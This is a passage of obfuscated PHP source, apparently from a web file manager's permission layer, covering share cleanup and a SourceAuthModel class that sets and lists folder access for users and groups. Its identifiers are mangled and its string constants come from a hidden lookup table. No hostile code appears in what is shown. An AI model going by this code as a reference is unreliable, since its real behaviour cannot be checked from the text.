($±§œ’ºş[$Ô…Ÿ…ì¢[557]] != $Ô…Ÿ…ì¢[228] && $this->shareFileMeta($±§œ’ºş[$Ô…Ÿ…ì¢[557]])) { $this->shareFileMeta($±§œ’ºş[$Ô…Ÿ…ì¢[557]], 0); } $this->remove($±§œ’ºş[$Ô…Ÿ…ì¢[687]]); return !0; } if ($šò»¡Ä‹ && $ø¶€ë§Š[$Ô…Ÿ…ì¢[851]] == $Ô…Ÿ…ì¢[2362]) { $‚Ç„Ş = $œ•Ó¨›Ü[$Ô…Ÿ…ì¢[851]] == $Ô…Ÿ…ì¢[2362] ? 1 : 0; $this->shareFileMeta($±§œ’ºş[$Ô…Ÿ…ì¢[557]], $‚Ç„Ş); $this->removeByFile($±§œ’ºş[$Ô…Ÿ…ì¢[557]]); } return $šò»¡Ä‹; } private function removeByFile($úï¤ó®•) { $‡À©ğŞ =& $_SERVER[ïÃ°£«Ê]; $²¼ï§ı = Model($‡À©ğŞ[934])->where(array($‡À©ğŞ[557] => $úï¤ó®•))->field($‡À©ğŞ[191])->select(); $Çª´­Ÿç = array_to_keyvalue($²¼ï§ı, $‡À©ğŞ[12], $‡À©ğŞ[191]); $•…ÅÕÂÜ = array($‡À©ğŞ[191] => array($‡À©ğŞ[7], $Çª´­Ÿç), $‡À©ğŞ[578] => 1); $²¼ï§ı = $this->where($•…ÅÕÂÜ)->field($‡À©ğŞ[687])->select(); if (empty($²¼ï§ı)) { return; } $Øäöóğ = array_to_keyvalue($²¼ï§ı, $‡À©ğŞ[12], $‡À©ğŞ[687]); $this->remove($Øäöóğ); } private function shareFileMeta($ñ‡¦Âˆí, $ää¨­™Ÿ = null) { $Óè©ğ½Ò =& $_SERVER[ïÃ°£«Ê]; $ó¦—Äêî = array($Óè©ğ½Ò[557] => $ñ‡¦Âˆí, $Óè©ğ½Ò[95] => $Óè©ğ½Ò[2367]); if (is_null($ää¨­™Ÿ)) { return Model($Óè©ğ½Ò[2368])->where($ó¦—Äêî)->find(); } $ó¦—Äêî[$Óè©ğ½Ò[451]] = $ää¨­™Ÿ; Model($Óè©ğ½Ò[2368])->add($ó¦—Äêî, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\137\163\157\x75\x72\x63\145\x5f\x61\165\164\x68"; public function getAuth($ØÛÂöşÏ) { $û¶Ì‹ù€ =& $_SERVER[ïÃ°£«Ê]; $éÍÎŠòï = $this->sourceAuthSelect($ØÛÂöşÏ); $²Ê›™µ¾ = array(); $­Æ½ôÙ = array(); $ÌÕÆí¡æ = 2 << 25; foreach ($éÍÎŠòï as $´ÄüÜÏ‚) { $ß•»Ş€¾ = Model($û¶Ì‹ù€[591])->listData($´ÄüÜÏ‚[$û¶Ì‹ù€[1642]]); if (!$ß•»Ş€¾) { continue; } $²Ê›™µ¾[] = $´ÄüÜÏ‚; $õ¦¨º«¿ = 0; if ($´ÄüÜÏ‚[$û¶Ì‹ù€[188]] == SourceModel::TYPE_GROUP) { $õ¦¨º«¿ = $ÌÕÆí¡æ * 2; } if ($´ÄüÜÏ‚[$û¶Ì‹ù€[188]] == SourceModel::TYPE_USER) { $õ¦¨º«¿ = $ÌÕÆí¡æ; } if ($´ÄüÜÏ‚[$û¶Ì‹ù€[188]] == SourceModel::TYPE_USER && $´ÄüÜÏ‚[$û¶Ì‹ù€[589]] == $û¶Ì‹ù€[228]) { $õ¦¨º«¿ = 0; } $­Æ½ôÙ[] = $ß•»Ş€¾[$û¶Ì‹ù€[502]] + $õ¦¨º«¿; } array_multisort($­Æ½ôÙ, SORT_DESC, $²Ê›™µ¾); return $²Ê›™µ¾; } public function sourceAuthSelect($ª¿¯¶¶) { $¼–ñÀú =& $_SERVER[ïÃ°£«Ê]; static $¹¦…ê»¡ = array(); $á™±‚ş¦ = is_array($ª¿¯¶¶) ? !1 : !0; if ($á™±‚ş¦) { $ª¿¯¶¶ = array($ª¿¯¶¶); } $¹–ä÷ãÇ = array(); foreach ($ª¿¯¶¶ as $áÕ½Ÿ–Ó) { if (isset($¹¦…ê»¡[$áÕ½Ÿ–Ó])) { $¹–ä÷ãÇ[$áÕ½Ÿ–Ó] = $¹¦…ê»¡[$áÕ½Ÿ–Ó]; } } if (count($¹–ä÷ãÇ) == count($ª¿¯¶¶)) { return $á™±‚ş¦ ? $¹–ä÷ãÇ[$ª¿¯¶¶[0]] : $¹–ä÷ãÇ; } $³ç“çË• = $¼–ñÀú[2369]; $Ùã³Øªª = array($¼–ñÀú[191] => array($¼–ñÀú[7], $ª¿¯¶¶)); $Æ¢¶É = $this->field($³ç“çË•)->order($¼–ñÀú[487])->where($Ùã³Øªª)->select(); $â€é¸õ± = array_to_keyvalue_group($Æ¢¶É, $¼–ñÀú[191]); foreach ($ª¿¯¶¶ as $áÕ½Ÿ–Ó) { $¹¦…ê»¡[$áÕ½Ÿ–Ó] = $â€é¸õ±[$áÕ½Ÿ–Ó] ? $â€é¸õ±[$áÕ½Ÿ–Ó] : array(); } if ($á™±‚ş¦) { return $Æ¢¶É; } return $â€é¸õ±; } public function setAuth($Ì÷ÊºÛŞ, $Áò÷ë…») { $ôƒø ¶™ =& $_SERVER[ïÃ°£«Ê]; $¾ß¦Ô²ë = Model($ôƒø ¶™[1535])->sourceInfo($Ì÷ÊºÛŞ); if (!$¾ß¦Ô²ë) { return !1; } if ($¾ß¦Ô²ë[$ôƒø ¶™[188]] != SourceModel::TYPE_GROUP) { return !1; } $¢ôå½¥ = 1; $©Ï­ƒöĞ = $¾ß¦Ô²ë[$ôƒø ¶™[589]]; if ($©Ï­ƒöĞ != $¢ôå½¥) { $­Ï†Ï´ = array($ôƒø ¶™[1497] => $©Ï­ƒöĞ); $÷•£Š® = Model($ôƒø ¶™[2279])->field($ôƒø ¶™[1594])->where($­Ï†Ï´)->select(); $÷•£Š® = array_to_keyvalue($÷•£Š®, $ôƒø ¶™[12], $ôƒø ¶™[1594]); } $ºÒ¢Ëü = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ö²ÉÎ†› = array(); foreach ($Áò÷ë…» as $ªÍàÓµŸ) { if (!in_array($ªÍàÓµŸ[$ôƒø ¶™[188]], $ºÒ¢Ëü)) { show_json(LNG($ôƒø ¶™[2370]), !1); } if ($©Ï­ƒöĞ != $¢ôå½¥) { if ($ªÍàÓµŸ[$ôƒø ¶™[188]] == SourceModel::TYPE_GROUP) { } if ($ªÍàÓµŸ[$ôƒø ¶™[589]] != 0 && !in_array($ªÍàÓµŸ[$ôƒø ¶™[589]], $÷•£Š®)) { } } if ($ªÍàÓµŸ[$ôƒø ¶™[589]] == 0) { $ªÍàÓµŸ[$ôƒø ¶™[188]] = SourceModel::TYPE_USER; } $ö²ÉÎ†›[] = array($ôƒø ¶™[191] => $Ì÷ÊºÛŞ, $ôƒø ¶™[188] => intval($ªÍàÓµŸ[$ôƒø ¶™[188]]), $ôƒø ¶™[589] => intval($ªÍàÓµŸ[$ôƒø ¶™[589]]), $ôƒø ¶™[1642] => intval($ªÍàÓµŸ[$ôƒø ¶™[1642]]) ? intval($ªÍàÓµŸ[$ôƒø ¶™[1642]]) : 0, $ôƒø ¶™[2348] => intval($ªÍàÓµŸ[$ôƒø ¶™[2348]]) ? intval($ªÍàÓµŸ[$ôƒø ¶™[2348]]) : -1); } $this->where(array($ôƒø ¶™[506] => $Ì÷ÊºÛŞ))->delete(); $this->addAll($ö²ÉÎ†›); return !0; } public function authClear($İß¨Ùù) { $çó€‰°÷ =& $_SERVER[ïÃ°£«Ê]; $îûçÅôï = Model($çó€‰°÷[1535])->sourceInfo($İß¨Ùù); $°ãŞı¦ = array($İß¨Ùù); if ($îûçÅôï[$çó€‰°÷[500]] == $çó€‰°÷[91]) { $®´İÎ¾Œ = array($çó€‰°÷[674] => array($çó€‰°÷[635], $îûçÅôï[$çó€‰°÷[604]] . $İß¨Ùù . $çó€‰°÷[636])); $°ãŞı¦ = Model($çó€‰°÷[1535])->field($çó€‰°÷[506])->where($®´İÎ¾Œ)->getField($çó€‰°÷[191], !0); $°ãŞı¦[] = $İß¨Ùù; } $this->where(array($çó€‰°÷[506] => array($çó€‰°÷[507], $°ãŞı¦)))->delete(); return !0; } public function getAllParent($‡ŠÓ¬¿î) { $©Û×òÛ =& $_SERVER[ïÃ°£«Ê]; $Âßš‡Ô = Model($©Û×òÛ[1535])->sourceInfo($‡ŠÓ¬¿î); if (!$Âßš‡Ô || $Âßš‡Ô[$©Û×òÛ[188]] != SourceModel::TYPE_GROUP) { return array(); } $ü˜Ô† è = Model($©Û×òÛ[1535])->parentLevelArray($Âßš‡Ô[$©Û×òÛ[604]]); $÷“¬ÑÌ = array_merge(array(intval($‡ŠÓ¬¿î)), array_reverse($ü˜Ô† è)); $µŞÔ€·” = $this->sourceAuthSelect($÷“¬ÑÌ); $ì¦î›™Ÿ = $GLOBALS[$©Û×òÛ[6]][$©Û×òÛ[92]][$©Û×òÛ[2292]] == 1; $´æ‹ğâğ = $ì¦î›™Ÿ ? 3 : 2; $Ñä¼ì²› = Model($©Û×òÛ[1495])->getInfo($Âßš‡Ô[$©Û×òÛ[589]]); $ ËÆì–© = explode($©Û×òÛ[50], trim($Ñä¼ì²›[$©Û×òÛ[604]], $©Û×òÛ[50])); $í‰ë¢Èõ = array_merge(array($Ñä¼ì²›[$©Û×òÛ[1497]]), array_reverse(array_slice($ ËÆì–©, $´æ‹ğâğ))); foreach ($µŞÔ€·” as $‡ŠÓ¬¿î => $ÍÁò½•Ÿ) { foreach ($ÍÁò½•Ÿ as $ØÅ¼¸º) { if (!$ØÅ¼¸º || !$ØÅ¼¸º[$©Û×òÛ[589]] || $ØÅ¼¸º[$©Û×òÛ[589]] == $©Û×òÛ[228]) { continue; } if ($ØÅ¼¸º[$©Û×òÛ[188]] != SourceModel::TYPE_GROUP) { continue; } $í‰ë¢Èõ[] = $ØÅ¼¸º[$©Û×òÛ[589]]; } } $í‰ë¢Èõ = array_unique($í‰ë¢Èõ); $ÚÉ’¯Ş… = array($©Û×òÛ[428] => _get($GLOBALS[$©Û×òÛ[7]], $©Û×òÛ[428], 1), $©Û×òÛ[439] => _get($GLOBALS[$©Û×òÛ[7]], $©Û×òÛ[439], 500)); $GLOBALS[$©Û×òÛ[7]][$©Û×òÛ[428]] = 1; $GLOBALS[$©Û×òÛ[7]][$©Û×òÛ[439]] = 500; $û“¨›ùå = array($©Û×òÛ[508] => 0, $©Û×òÛ[2191] => AuthModel::authAll(), $©Û×òÛ[509] => LNG($©Û×òÛ[2371]), $©Û×òÛ[2206] => $©Û×òÛ[2372]); $¡µ™ïı = array(); $“ùæ½§¢ = explode($©Û×òÛ[50], $©Û×òÛ[2373]); $Œ ±Ì™ = explode($©Û×òÛ[50], $©Û×òÛ[2374]); foreach ($í‰ë¢Èõ as $º´ÊÒÏ) { $Üò‰†¢¨ = Model($©Û×òÛ[1495])->getInfo($º´ÊÒÏ); $ş§á¦ÕÀ = array_field_key($Üò‰†¢¨, $“ùæ½§¢); $ô¨şÌúÃ = Model($©Û×òÛ[617])->listByGroup($º´ÊÒÏ); foreach ($ô¨şÌúÃ[$©Û×òÛ[446]] as $ã»€¢±³ => $÷ı½¯ì) { $this->userGroupList($÷ı½¯ì[$©Û×òÛ[1594]], $÷ı½¯ì); $¢˜ôß×Õ = $÷ı½¯ì[$©Û×òÛ[1594]] . $©Û×òÛ[12]; if (isset($¡µ™ïı[$¢˜ôß×Õ])) { continue; } $¡ôÃ¸Ñá = Model($©Û×òÛ[2375])->listData($÷ı½¯ì[$©Û×òÛ[2376]]); $÷ı½¯ì[$©Û×òÛ[2377]] = Action($©Û×òÛ[2378])->parseUrl($÷ı½¯ì[$©Û×òÛ[2377]]); $÷ı½¯ì[$©Û×òÛ[1945]] = $¡ôÃ¸Ñá && $¡ôÃ¸Ñá[$©Û×òÛ[2379]] == 1; $™ö²ïô = $this->groupRootAuth($º´ÊÒÏ, $÷ı½¯ì[$©Û×òÛ[1594]]); $™ö²ïô = $÷ı½¯ì[$©Û×òÛ[1945]] ? $û“¨›ùå : $™ö²ïô; $¡µ™ïı[$¢˜ôß×Õ] = array($©Û×òÛ[2380] => $©Û×òÛ[2381], $©Û×òÛ[2382] => LNG($©Û×òÛ[2383]), $©Û×òÛ[2360] => array_field_key($÷ı½¯ì, $Œ ±Ì™), $©Û×òÛ[502] => $™ö²ïô, $©Û×òÛ[503] => $™ö²ïô[$©Û×òÛ[502]], $©Û×òÛ[2384] => $ş§á¦ÕÀ); } } $GLOBALS[$©Û×òÛ[7]][$©Û×òÛ[428]] = $ÚÉ’¯Ş…[$©Û×òÛ[428]]; $GLOBALS[$©Û×òÛ[7]][$©Û×òÛ[439]] = $ÚÉ’¯Ş…[$©Û×òÛ[439]]; foreach ($µŞÔ€·” as $‡ŠÓ¬¿î => $ÍÁò½•Ÿ) { if (!$ÍÁò½•Ÿ) { continue; } foreach ($ÍÁò½•Ÿ as $ØÅ¼¸º) { if (!$ØÅ¼¸º || !$ØÅ¼¸º[$©Û×òÛ[589]] || $ØÅ¼¸º[$©Û×òÛ[589]] == $©Û×òÛ[228]) { continue; } if ($ØÅ¼¸º[$©Û×òÛ[188]] != SourceModel::TYPE_USER) { continue; } $¢˜ôß×Õ = $ØÅ¼¸º[$©Û×òÛ[589]] . $©Û×òÛ[12]; if (isset($¡µ™ïı[$¢˜ôß×Õ])) { continue; } $¶ŸşÇ’› = $this->authMake($ÍÁò½•Ÿ, $¢˜ôß×Õ); if (!$¶ŸşÇ’› || !$¶ŸşÇ’›[$©Û×òÛ[2382]]) { continue; } $¡µ™ïı[$¢˜ôß×Õ] = array($©Û×òÛ[2380] => $©Û×òÛ[2385], $©Û×òÛ[2382] => $¶ŸşÇ’›[$©Û×òÛ[2382]], $©Û×òÛ[2360] => Model($©Û×òÛ[617])->getInfoSimpleOuter($¢˜ôß×Õ), $©Û×òÛ[502] => $¶ŸşÇ’›[$©Û×òÛ[556]], $©Û×òÛ[503] => $¶ŸşÇ’›[$©Û×òÛ[556]][$©Û×òÛ[502]], $©Û×òÛ[2384] => $¶ŸşÇ’›[$©Û×òÛ[2386]]); } } foreach ($µŞÔ€·” as $‡ŠÓ¬¿î => $ÍÁò½•Ÿ) { if (!$ÍÁò½•Ÿ) { continue; } foreach ($¡µ™ïı as $¢˜ôß×Õ => $Ø•Õù¡í) { if ($Ø•Õù¡í[$©Û×òÛ[2360]][$©Û×òÛ[1945]] || $Ø•Õù¡í[$©Û×òÛ[2380]] == $©Û×òÛ[2385]) { continue; } $¶ŸşÇ’› = $this->authMake($ÍÁò½•Ÿ, $¢˜ôß×Õ); if (!$¶ŸşÇ’› || !$¶ŸşÇ’›[$©Û×òÛ[2382]]) { continue; } $¡µ™ïı[$¢˜ôß×Õ] = array($©Û×òÛ[2380] => $©Û×òÛ[2385], $©Û×òÛ[2382] => $¶ŸşÇ’›[$©Û×òÛ[2382]], $©Û×òÛ[2360] => $Ø•Õù¡í[$©Û×òÛ[2360]], $©Û×òÛ[502] => $¶ŸşÇ’›[$©Û×òÛ[556]], $©Û×òÛ[503] => $¶ŸşÇ’›[$©Û×òÛ[556]][$©Û×òÛ[502]], $©Û×òÛ[2384] => $¶ŸşÇ’›[$©Û×òÛ[2386]]); } } $¡µ™ïı = array_sort_by($¡µ™ïı, $©Û×òÛ[503], $©Û×òÛ[540]); return $¡µ™ïı; } public function getAllChildren($£Ìİ³€Ü) { $ÚëÄ‰âÅ =& $_SERVER[ïÃ°£«Ê]; $êò±Éá™ = Model($ÚëÄ‰âÅ[1535])->sourceInfo($£Ìİ³€Ü); if ($êò±Éá™[$ÚëÄ‰âÅ[500]] != $ÚëÄ‰âÅ[91]) { return $this->sourceListAuth(array($£Ìİ³€Ü)); } if ($êò±Éá™[$ÚëÄ‰âÅ[188]] != SourceModel::TYPE_GROUP) { return array(); } $µÖ©„¯İ = 1; $Ë·ÓäÍ = array($£Ìİ³€Ü); if ($êò±Éá™[$ÚëÄ‰âÅ[190]] == $ÚëÄ‰âÅ[228] && $êò±Éá™[$ÚëÄ‰âÅ[589]] != $µÖ©„¯İ) { $Ë·ÓäÍ = $this->groupChidldAllRootSource($êò±Éá™[$ÚëÄ‰âÅ[589]]); } $È§Ø„™û = $this->field($ÚëÄ‰âÅ[191])->group($ÚëÄ‰âÅ[191])->select(); $È§Ø„™û = array_to_keyvalue($È§Ø„™û, $ÚëÄ‰âÅ[12], $ÚëÄ‰âÅ[191]); if (!$È§Ø„™û) { return array(); } $ŞäòŸ™² = $ÚëÄ‰âÅ[2387]; $’Øª–ºü = array($ÚëÄ‰âÅ[191] => array($ÚëÄ‰âÅ[7], $È§Ø„™û), $ÚëÄ‰âÅ[520] => $ÚëÄ‰âÅ[228]); $  Á«ä” = Model($ÚëÄ‰âÅ[934])->field($ŞäòŸ™²)->where($’Øª–ºü)->select(); $¯“À©¾í = array($£Ìİ³€Ü); foreach ($  Á«ä” as $É¾š÷àù) { foreach ($Ë·ÓäÍ as $¨Î¶ó³) { $ïÕíÊó = $ÚëÄ‰âÅ[50] . $¨Î¶ó³ . $ÚëÄ‰âÅ[50]; $÷”‡şÈÏ = $É¾š÷àù[$ÚëÄ‰âÅ[604]] . $É¾š÷àù[$ÚëÄ‰âÅ[191]] . $ÚëÄ‰âÅ[50]; if (strstr($÷”‡şÈÏ, $ïÕíÊó)) { $¯“À©¾í[] = $É¾š÷àù[$ÚëÄ‰âÅ[191]]; break; } } } return $this->sourceListAuth($¯“À©¾í); } private function sourceListAuth($ÛÊãù²î) { $¤»ê¡æà =& $_SERVER[ïÃ°£«Ê]; $¨Ïì£‘Ñ = Model($¤»ê¡æà[1535])->sourceListInfo($ÛÊãù²î, !0); $‚É‘ëÀ = $this->sourceAuthSelect($ÛÊãù²î); $‹Îšìïë = array(); $å©¨½Öç = array(); foreach ($¨Ïì£‘Ñ as $à¦ãè®) { unset($à¦ãè®[$¤»ê¡æà[543]]); unset($à¦ãè®[$¤»ê¡æà[541]]); unset($à¦ãè®[$¤»ê¡æà[502]]); unset($à¦ãè®[$¤»ê¡æà[90]]); $¡…üîã = $‚É‘ëÀ[$à¦ãè®[$¤»ê¡æà[191]]]; if (!$¡…üîã) { continue; } $à¦ãè®[$¤»ê¡æà[2384]] = $this->authTargetInfo($¡…üîã); $à¦ãè®[$¤»ê¡æà[602]] = rtrim($à¦ãè®[$¤»ê¡æà[608]], $¤»ê¡æà[8]) . $¤»ê¡æà[8] . ltrim($à¦ãè®[$¤»ê¡æà[602]], $¤»ê¡æà[8]); $‹Îšìïë[] = $à¦ãè®; $¾çÚÍÒì = count(explode($¤»ê¡æà[8], trim($à¦ãè®[$¤»ê¡æà[602]], $¤»ê¡æà[8]))); $å©¨½Öç[] = $¾çÚÍÒì + ($à¦ãè®[$¤»ê¡æà[33]] == $¤»ê¡æà[78] ? 0 : 1000); } array_multisort($å©¨½Öç, SORT_ASC, $‹Îšìïë); return $‹Îšìïë; } private function groupChidldAllRootSource($•šˆ…àó) { $¾—ôø¨‘ =& $_SERVER[ïÃ°£«Ê]; $¥¾Ñßú÷ = Model($¾—ôø¨‘[1495])->groupChildrenAll($•šˆ…àó); $ùé×Üİß = array($¾—ôø¨‘[190] => 0, $¾—ôø¨‘[589] => array($¾—ôø¨‘[7], $¥¾Ñßú÷), $¾—ôø¨‘[188] => SourceModel::TYPE_GROUP); $‚İÄ­Ê€ = Model($¾—ôø¨‘[934])->field($¾—ôø¨‘[191])->where($ùé×Üİß)->select(); $‚İÄ­Ê€ = array_to_keyvalue($‚İÄ­Ê€, $¾—ôø¨‘[12], $¾—ôø¨‘[191]); return $‚İÄ­Ê€; } private function authTargetInfo($Ğè³­…İ) { $À´Êıîê =& $_SERVER[ïÃ°£«Ê]; $êìùªçŠ = array(); $µ¨…ÃÏ€ = array(); $Ê¦µ³ò² = 2 << 25; foreach ($Ğè³­…İ as $©×”¾) { $¬°ÃÔ§ª = Model($À´Êıîê[591])->listData($©×”¾[$À´Êıîê[1642]]); if (!$¬°ÃÔ§ª) { continue; } if ($©×”¾[$À´Êıîê[188]] == SourceModel::TYPE_USER) { $§ó€ÈÚ… = Model($À´Êıîê[597])->getInfoSimpleOuter($©×”¾[$À´Êıîê[589]]); if ($§ó€ÈÚ…[$À´Êıîê[1594]] == $À´Êıîê[1382]) { continue; } if ($§ó€ÈÚ…[$À´Êıîê[1594]] == $À´Êıîê[228]) { $§ó€ÈÚ…[$À´Êıîê[32]] = LNG($À´Êıîê[2388]); } } else { $§ó€ÈÚ… = Model($À´Êıîê[605])->getInfoSimple($©×”¾[$À´Êıîê[589]]); } if (!$§ó€ÈÚ…) { continue; } $§ó€ÈÚ…[$À´Êıîê[556]] = $¬°ÃÔ§ª; $êìùªçŠ[] = $§ó€ÈÚ…; $Š£İ‚´› = 0; if ($©×”¾[$À´Êıîê[188]] == SourceModel::TYPE_GROUP) { $Š£İ‚´› = $Ê¦µ³ò² * 2; } if ($©×”¾[$À´Êıîê[188]] == SourceModel::TYPE_USER) { $Š£İ‚´› = $Ê¦µ³ò²; } if ($©×”¾[$À´Êıîê[188]] == SourceModel::TYPE_USER && $©×”¾[$À´Êıîê[589]] == $À´Êıîê[228]) { $Š£İ‚´› = 0; } $µ¨…ÃÏ€[] = $¬°ÃÔ§ª[$À´Êıîê[502]] + $Š£İ‚´›; } array_multisort($µ¨…ÃÏ€, SORT_DESC, $êìùªçŠ); return $êìùªçŠ; } public function getAllChildrenByUser($æÏ¤Ã±Ï, $°Â³÷•) { $ğ˜Áî€î =& $_SERVER[ïÃ°£«Ê]; $œ‘Ò–­ = Model($ğ˜Áî€î[617])->getInfo($°Â³÷•); if (!$°Â³÷• || !$æÏ¤Ã±Ï || !$œ‘Ò–­) { return array(); } $¨‰òåùó = Model($ğ˜Áî€î[1535])->sourceInfo($æÏ¤Ã±Ï); $¦ªí ˜ú = array(); $¶¢Ş‚° = 1; if ($¨‰òåùó[$ğ˜Áî€î[190]] == $ğ˜Áî€î[228] && $¨‰òåùó[$ğ˜Áî€î[589]] != $¶¢Ş‚° && $this->groupContainUser($¨‰òåùó[$ğ˜Áî€î[589]], $°Â³÷•)) { foreach ($œ‘Ò–­[$ğ˜Áî€î[1496]] as $¯‘üÖÆ) { $ËœË÷İú = Model($ğ˜Áî€î[605])->getInfo($¯‘üÖÆ[$ğ˜Áî€î[1497]]); $÷º¶£¸« = Model($ğ˜Áî€î[617])->getInfoSimpleOuter($°Â³÷•); $÷º¶£¸«[$ğ˜Áî€î[556]] = $¯‘üÖÆ[$ğ˜Áî€î[502]]; if (Model($ğ˜Áî€î[591])->authCheckAction($¯‘üÖÆ[$ğ˜Áî€î[502]][$ğ˜Áî€î[502]], $ğ˜Áî€î[1566])) { continue; } $İ¹¸œˆÀ = array($ğ˜Áî€î[32] => $ğ˜Áî€î[1400] . $ËœË÷İú[$ğ˜Áî€î[32]], $ğ˜Áî€î[191] => $ËœË÷İú[$ğ˜Áî€î[90]][$ğ˜Áî€î[191]], $ğ˜Áî€î[87] => KodIO::make($ËœË÷İú[$ğ˜Áî€î[90]][$ğ˜Áî€î[191]]), $ğ˜Áî€î[190] => $ğ˜Áî€î[228], $ğ˜Áî€î[188] => $ğ˜Áî€î[598], $ğ˜Áî€î[33] => $ğ˜Áî€î[639], $ğ˜Áî€î[602] => $ËœË÷İú[$ğ˜Áî€î[609]], $ğ˜Áî€î[1497] => $ËœË÷İú[$ğ˜Áî€î[1497]], $ğ˜Áî€î[606] => $ËœË÷İú[$ğ˜Áî€î[190]], $ğ˜Áî€î[2384] => array($÷º¶£¸«)); $¦ªí ˜ú[$İ¹¸œˆÀ[$ğ˜Áî€î[191]]] = $İ¹¸œˆÀ; } } $ôĞ¨–¾ = array(); $Ùªíê”î = $this->getAllChildren($æÏ¤Ã±Ï); foreach ($Ùªíê”î as $¥—Ôëº¢) { $Ñ¸×»òñ = !1; foreach ($¥—Ôëº¢[$ğ˜Áî€î[2384]] as $ö«¦Ş³÷) { if ($ö«¦Ş³÷[$ğ˜Áî€î[1594]]) { if ($ö«¦Ş³÷[$ğ˜Áî€î[1594]] == $°Â³÷•) { $Ñ¸×»òñ = !0; break; } } if ($ö«¦Ş³÷[$ğ˜Áî€î[1497]]) { if ($this->groupContainUser($ö«¦Ş³÷[$ğ˜Áî€î[1497]], $°Â³÷•)) { $Ñ¸×»òñ = !0; break; } } } if ($Ñ¸×»òñ) { $ôĞ¨–¾[] = $¥—Ôëº¢; } $şøôó×¹ = $¥—Ôëº¢[$ğ˜Áî€î[191]]; if (isset($¦ªí ˜ú[$şøôó×¹])) { $¥—Ôëº¢[$ğ˜Áî€î[2384]][] = $¦ªí ˜ú[$şøôó×¹][0]; $¦ªí ˜ú[$şøôó×¹] = !1; } } $¦ªí ˜ú = array_filter(array_values($¦ªí ˜ú)); $ôĞ¨–¾ = array_merge($¦ªí ˜ú, $ôĞ¨–¾); return $ôĞ¨–¾; } public function setAllChildrenByUser($ğÍÌÈ¢ş, $Áî£ö½Ú, $‰¾ÃÜûØ) { $Ïœ±ıõ— =& $_SERVER[ïÃ°£«Ê]; $™àï–† = $this->getAllChildrenByUser($ğÍÌÈ¢ş, $Áî£ö½Ú); if (!$‰¾ÃÜûØ || !$™àï–†) { return !1; } foreach ($™àï–† as $£ÙåÄ¯Ş) { $”£ß¨Ç = array(); foreach ($£ÙåÄ¯Ş[$Ïœ±ıõ—[2384]] as $©ôû¾µĞ) { $¨Ëˆóí = $©ôû¾µĞ[$Ïœ±ıõ—[556]]; $Ê¸üÏŞ = $©ôû¾µĞ[$Ïœ±ıõ—[1594]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $İ¬Ş«ğÅ = $©ôû¾µĞ[$Ïœ±ıõ—[1594]] ? $©ôû¾µĞ[$Ïœ±ıõ—[1594]] : $©ôû¾µĞ[$Ïœ±ıõ—[1497]]; if ($©ôû¾µĞ[$Ïœ±ıõ—[1594]] && $©ôû¾µĞ[$Ïœ±ıõ—[1594]] == $Áî£ö½Ú) { continue; } $”£ß¨Ç[] = array($Ïœ±ıõ—[191] => $£ÙåÄ¯Ş[$Ïœ±ıõ—[191]], $Ïœ±ıõ—[188] => $Ê¸üÏŞ, $Ïœ±ıõ—[589] => intval($İ¬Ş«ğÅ), $Ïœ±ıõ—[1642] => isset($¨Ëˆóí[$Ïœ±ıõ—[487]]) ? intval($¨Ëˆóí[$Ïœ±ıõ—[487]]) : 0, $Ïœ±ıõ—[2348] => isset($¨Ëˆóí[$Ïœ±ıõ—[2348]]) ? intval($¨Ëˆóí[$Ïœ±ıõ—[2348]]) : -1); } $”£ß¨Ç[] = array($Ïœ±ıõ—[191] => $£ÙåÄ¯Ş[$Ïœ±ıõ—[191]], $Ïœ±ıõ—[188] => SourceModel::TYPE_USER, $Ïœ±ıõ—[589] => intval($Áî£ö½Ú), $Ïœ±ıõ—[1642] => intval($‰¾ÃÜûØ), $Ïœ±ıõ—[2348] => -1); $this->where(array($Ïœ±ıõ—[506] => $£ÙåÄ¯Ş[$Ïœ±ıõ—[191]]))->delete(); $this->addAll($”£ß¨Ç); } return !0; } public function get($€çÇ©ô¹) { $ÜäÈ²‚° = $this->getSourceList(array($€çÇ©ô¹), !0); return $ÜäÈ²‚°[0]; } public function getSourceList($ÀÚğó½, $ÈÎÎ¼“ = false, $äÜŒâ‚¦ = false) { $Š…Ñ­½ =& $_SERVER[ïÃ°£«Ê]; if (!$ÀÚğó½) { return array(); } $»¶«ôÆİ = Model($Š…Ñ­½[1535]); if (!$ÈÎÎ¼“ && count($ÀÚğó½) == 1) { $ÈÎÎ¼“ = array(); $ÈÎÎ¼“[$ÀÚğó½[0]] = $»¶«ôÆİ->sourceInfo($ÀÚğó½[0]); } if (!$ÈÎÎ¼“) { $ÈÜôğÁ» = array($Š…Ñ­½[506] => array($Š…Ñ­½[507], $ÀÚğó½)); $ÈÎÎ¼“ = $»¶«ôÆİ->field($Š…Ñ­½[2389])->where($ÈÜôğÁ»)->select(); $ÈÎÎ¼“ = array_to_keyvalue($ÈÎÎ¼“, $Š…Ñ­½[191]); } $ÓßÏ³ÂÑ = $ÀÚğó½; foreach ($ÈÎÎ¼“ as $Å…×Ë¦ì => $¨Éé”Ş) { $å™¸–¤í = $»¶«ôÆİ->parentLevelArray($¨Éé”Ş[$Š…Ñ­½[604]]); $ÓßÏ³ÂÑ = array_merge($ÓßÏ³ÂÑ, array(intval($Å…×Ë¦ì)), array_reverse($å™¸–¤í)); } $ÓßÏ³ÂÑ = array_values(array_unique($ÓßÏ³ÂÑ)); if (!$ÓßÏ³ÂÑ) { return array(); } $À‹ı°Ññ = $this->sourceAuthSelect($ÓßÏ³ÂÑ); $ èª–¨î = array(); foreach ($ÓßÏ³ÂÑ as $ÙÔ¬¯İ¼) { if (isset($À‹ı°Ññ[$ÙÔ¬¯İ¼])) { $ èª–¨î[$ÙÔ¬¯İ¼] = $À‹ı°Ññ[$ÙÔ¬¯İ¼]; } } $«Å®ğ„ˆ = $this->userIsRoot($äÜŒâ‚¦); $Ûô“çÖŸ = AuthModel::authAll(); $İĞ€µºƒ = array($Š…Ñ­½[503] => $Ûô“çÖŸ, $Š…Ñ­½[2390] => array($Š…Ñ­½[508] => 0, $Š…Ñ­½[2191] => $Ûô“çÖŸ, $Š…Ñ­½[509] => LNG($Š…Ñ­½[2371]), $Š…Ñ­½[2206] => $Š…Ñ­½[2372])); $«ïâ» = array(); foreach ($ÈÎÎ¼“ as $ÙÔ¬¯İ¼ => $’å¨ö‰ï) { if ($«Å®ğ„ˆ && $GLOBALS[$Š…Ñ­½[6]][$Š…Ñ­½[2204]]) { $«ïâ»[$ÙÔ¬¯İ¼] = $İĞ€µºƒ; continue; } 